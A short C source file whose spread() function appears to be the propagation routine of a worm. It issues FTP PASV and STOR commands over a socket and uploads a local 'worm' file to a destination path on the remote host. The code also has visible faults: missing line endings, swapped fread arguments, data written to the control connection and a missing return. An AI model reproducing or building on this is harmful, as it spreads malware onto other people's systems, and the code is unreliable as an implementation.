#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
//---
#include "spread.h"

int spread(int fd, const char *worm, const char *dest) {
  FILE *fp;
  char buffer[256];
  char stor[64];
  char garbage[64];
  size_t read_bytes;

  if(send(fd, "PASV", 4, 0) < 0) {
    perror("send");
    return -1;
  }

  if(recv(fd, garbage, sizeof garbage, 0) < 0) {
    perror("recv");
    return -1;
  }

  snprintf(stor, sizeof stor, "STOR %s", dest);
  if(send(fd, stor, sizeof stor, 0) < 0) {
    perror("send");
    return -1;
  }

  if((fp = fopen(worm, "rb")) == NULL) {
    fprintf(stderr, "Error: Opening file \"%s\" failed!\n", worm);
    return -1;
  }

  while((read_bytes = fread(buffer, sizeof buffer, sizeof(char), fp)) > 0) {
    write(fd, buffer, read_bytes);
  }

  fclose(fp);
}
